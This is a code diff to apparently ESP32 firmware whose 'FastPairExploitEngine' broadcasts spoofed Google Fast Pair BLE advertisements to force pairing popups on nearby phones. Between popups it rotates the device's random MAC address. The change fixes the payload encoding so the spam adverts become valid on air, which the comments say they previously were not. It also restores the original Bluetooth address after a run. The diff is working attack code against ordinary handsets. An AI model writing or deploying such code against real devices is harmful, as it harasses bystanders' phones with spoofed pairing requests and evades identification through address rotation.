@@ -3403,7 +3403,23 @@ bool FastPairExploitEngine::exploitFastPairConnection(NimBLEAddress target, Fast
 // Rotate the advertised BLE address at the interface/host level WITHOUT tearing
 // the controller down. Mirrors bleSpamRestartAdvertiserForMac() in ble_spam.cpp:
 // the stack stays up, we only swap the random static address between popups.
+// esp_iface_mac_addr_set writes a global interface setting that outlives this
+// module, so the rotated address has to be put back or every later advert —
+// including the BLE API control link — goes out under the last spam address and
+// an app pinning a peer address loses the device. Snapshot before the first
+// override; esp_read_mac returns the override once one is installed.
+static uint8_t fastPairOriginalBtMac[6];
+static bool fastPairOriginalBtMacSaved = false;
+
+static void fastPairRestoreAddress() {
+    if (!fastPairOriginalBtMacSaved) return;
+    esp_iface_mac_addr_set(fastPairOriginalBtMac, ESP_MAC_BT);
+}
+
 static void fastPairRotateAddress(const uint8_t *mac) {
+    if (!fastPairOriginalBtMacSaved && esp_read_mac(fastPairOriginalBtMac, ESP_MAC_BT) == ESP_OK) {
+        fastPairOriginalBtMacSaved = true;
+    }
     esp_iface_mac_addr_set(mac, ESP_MAC_BT);
 #if defined(CONFIG_BT_NIMBLE_ENABLED) && defined(HAS_BLE_HS_H)
     // ble_hs_id_set_rnd wants little-endian bytes; a valid random *static*
@@ -3442,9 +3458,13 @@ void FastPairExploitEngine::spamFastPairPopups(FastPairPopupType popupType, int 
     // FastPair run. ble_spam.cpp:1441 already does this for the other engine.
     AutoCleanup cleanup([]() {
         BLEStateManager::deinitBLE(true);
+        // Order matters: restore after the stack is down so the next init reads
+        // the factory address, and after setOwnAddrType is back to PUBLIC so the
+        // restored public address is the one actually advertised.
 #ifdef CONFIG_BT_NIMBLE_ENABLED
         NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_PUBLIC);
 #endif
+        fastPairRestoreAddress();
     });
 
     NimBLEAdvertising *pAdvertising = NimBLEDevice::getAdvertising();
@@ -3468,9 +3488,20 @@ void FastPairExploitEngine::spamFastPairPopups(FastPairPopupType popupType, int 
         pAdvertising->stop();
         fastPairRotateAddress(mac);
 
+        // createFastPairAdvertisement emits *complete* AD structures (a 0x03
+        // Complete-16-bit-UUID record, a 0x16 Service Data record for 0xFE2C, and a
+        // 0x0A Tx Power record). setManufacturerData() wrapped that in a second AD
+        // header, so the whole thing went on air as manufacturer data under company
+        // ID 0x0303 — packet capture over 60 attempts saw zero valid 0xFE2C adverts
+        // and no handset ever showed a popup. addData() appends the records
+        // verbatim, which is what ble_spam.cpp's byte-identical Google payload does
+        // (ble_spam.cpp:311-330) and which does produce valid adverts on air.
         uint8_t fpData[14];
         createFastPairAdvertisement(fpData, modelId);
-        pAdvertising->setManufacturerData(fpData, sizeof(fpData));
+        NimBLEAdvertisementData fpAdvData;
+        fpAdvData.addData(fpData, sizeof(fpData));
+        fpAdvData.setFlags(0x06);
+        pAdvertising->setAdvertisementData(fpAdvData);
         pAdvertising->start(0);
         delay(20);
         pAdvertising->stop();
